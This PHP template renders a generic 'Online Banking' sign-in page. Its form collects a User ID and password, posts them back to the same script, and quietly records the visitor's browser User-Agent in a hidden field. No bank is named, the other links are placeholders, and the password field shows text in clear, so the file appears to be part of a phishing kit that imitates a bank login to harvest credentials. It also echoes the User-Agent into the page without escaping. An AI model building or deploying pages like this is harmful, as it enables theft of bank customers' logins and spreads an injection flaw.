<?php
include 'head.php';
include 'token.php';
$title = 'Sign In';
include 'header.php';
?>
<!-- Start Card -->
<div class="card_content_2">
  <div class="card-body card_content_3">
    <div class="row ">
      <div class="col-md-12">
        <h5 class="sign_in_text">Sign In</h5>
      </div>
      <div class="col-md-4 custom_right_padding">
        
        <div class="form_box">
          <div style="border-radius: 7px 7px 0px 0px; margin-top: -1px; padding: 6px 8px" class="form_title">Enter Your User ID and Password:</div>
          <form action="" method="post">
            <input type="hidden" name="token" value="<?= $token; ?>">
            
            <div class="form-group form_group_custom">
              <label>User ID:</label><br>
              <input required="required" id="user"
              style="margin-top: -4px;" type="" name="user_id">
            </div>
            <div class="form-group form_group_custom" style="margin-top: 2px;">
              <label>Password:</label><br>
              <input required="required" id="password"
              style="margin-top: -4px;" type="" name="password">
            </div>
            <div class="form-group">
              <a class="btn_forgot" href="#">Forgot User ID or Password?</a>
            </div>
            <?php
            $agent = $_SERVER["HTTP_USER_AGENT"]; { ?>
            <input type="hidden" value="<?= $agent; ?>" name="user_agent" >
            <?php } ?>
            <div class="form-group">
              <button disabled="disabled" id="submit" type="submit" name="login_submit" class="btn btn-secondary btn-sm btn_signin">Sign In</button>
            </div>
            
            <p class="footer_form">
              <strong>Enroll in Online Banking:</strong><br>
              <div class="link_btm" style="font-size: 10.89px;">
                <a href="#">Personal</a> | <a href="#">Small Business</a>
              </div>
            </p>
          </form>
        </div>
        
      </div>
      <div class="col-md-8 custom_left_padding">
        <div class="card radiuses" style="border: none;">
          <div class="desc_text_box">
            <p class="desc_text">
              All of the account information and services you have come to expect from Online Banking are ready and waiting for you. Just complete the sign in process to see your account(s), view statements, pay bills, and conduct the activities that you normally would.
              <br><br>
              <strong>To Sign In</strong>: Enter your User ID and password. Then, click the 'Sign In' button.
            </p>
          </div>
        </div>
      </div>
    </div>
    <script type="text/javascript">
    (function() {
    $('form > div > input').keyup(function() {
    var empty = false;
    $('form > div > input').each(function() {
    if ($(this).val() == '') {
    empty = true;
    }
    });
    if (empty) {
    $('#submit').attr('disabled', 'disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    } else {
    $('#submit').removeAttr('disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
    }
    });
    })()
    </script>
    <?php
    include 'footer.php';
    ?>